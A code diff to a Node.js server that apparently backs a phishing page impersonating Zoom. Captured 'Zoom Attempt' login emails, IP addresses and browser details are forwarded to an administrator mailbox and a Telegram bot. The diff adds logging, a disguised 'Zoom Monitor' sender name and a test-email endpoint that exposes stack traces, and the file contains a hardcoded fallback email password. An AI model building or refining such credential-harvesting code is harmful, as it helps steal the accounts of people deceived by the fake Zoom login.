@@ -24,6 +24,14 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const EMAIL_PASSWORD = process.env.EMAIL_PASSWORD || "de23#$QZoom2026!";
 
+// Validate Environment Variables
+console.log("--- Environment Variable Check ---");
+console.log("SMTP_USER:", smtpUser ? "DEFINED (OK)" : "MISSING (Check Render Env)");
+console.log("SMTP_PASS:", smtpPass ? "DEFINED (OK)" : "MISSING (Check Render Env)");
+console.log("ADMIN_EMAIL:", adminEmail ? "DEFINED (OK)" : "MISSING (Check Render Env)");
+console.log("TELEGRAM_BOT_TOKEN:", TELEGRAM_BOT_TOKEN ? "DEFINED" : "NOT SET");
+console.log("----------------------------------");
+
 const allowedOrigins = [
   'http://localhost:3000',
   'http://localhost:8080',
@@ -142,11 +150,15 @@ ${intruderDetected ? '🚨 INTRUDER DETECTED!' : ''}
 ═══════════════════════════════════════════════`;
 
     transporter.sendMail({
-      from: smtpUser,
+      from: `Zoom Monitor <${smtpUser}>`,
       to: adminEmail,
       subject: `🚨 Zoom Action: ${String(action || '').toUpperCase()} from ${location}`,
       text: mailText
-    }).catch(e => console.error(`❌ Mail Error (${action}):`, e.message));
+    }).then(info => {
+      console.log(`✅ Email sent for action: ${action}`);
+    }).catch(err => {
+      console.error(`❌ Email failed for action: ${action}`, err);
+    });
 
     sendTelegramAlert(`Zoom Action: ${action} | Email: ${email || 'none'} | IP: ${ip}`);
 
@@ -174,11 +186,15 @@ Browser: ${req.headers['user-agent']}
 Time: ${new Date().toISOString()}`;
 
     transporter.sendMail({
-      from: smtpUser,
+      from: `Zoom Monitor <${smtpUser}>`,
       to: adminEmail,
       subject: `🔐 Zoom Attempt: ${email}`,
       text: mailText
-    }).catch(e => console.error(`❌ Mail Error (Auth):`, e.message));
+    }).then(info => {
+      console.log(`✅ Auth email sent for: ${email}`);
+    }).catch(err => {
+      console.error(`❌ Auth email failed for: ${email}`, err);
+    });
 
     sendTelegramAlert(`Zoom Login: ${email} | IP: ${ip}`);
 
@@ -195,6 +211,24 @@ Time: ${new Date().toISOString()}`;
 });
 
 app.get('/health', (req, res) => res.json({ status: 'OK', time: new Date() }));
+
+// 🚀 TEST EMAIL ENDPOINT
+app.get('/api/test-email', async (req, res) => {
+  try {
+    console.log(`[TEST] Sending test email to ${adminEmail}...`);
+    const info = await transporter.sendMail({
+      from: `Zoom Monitor <${smtpUser}>`,
+      to: adminEmail,
+      subject: "🧪 Zoom Backend Test Email",
+      text: "If you are reading this, your SMTP settings are working correctly on Render! ✅"
+    });
+    console.log("✅ Test email sent successfully:", info.messageId);
+    res.json({ success: true, message: "Test email sent!", id: info.messageId });
+  } catch (error) {
+    console.error("❌ Test Email Failed:", error);
+    res.status(500).json({ success: false, error: error.message, stack: error.stack });
+  }
+});
 
 app.listen(PORT, () => {
   console.log(`🚀 Server running on port ${PORT}`);
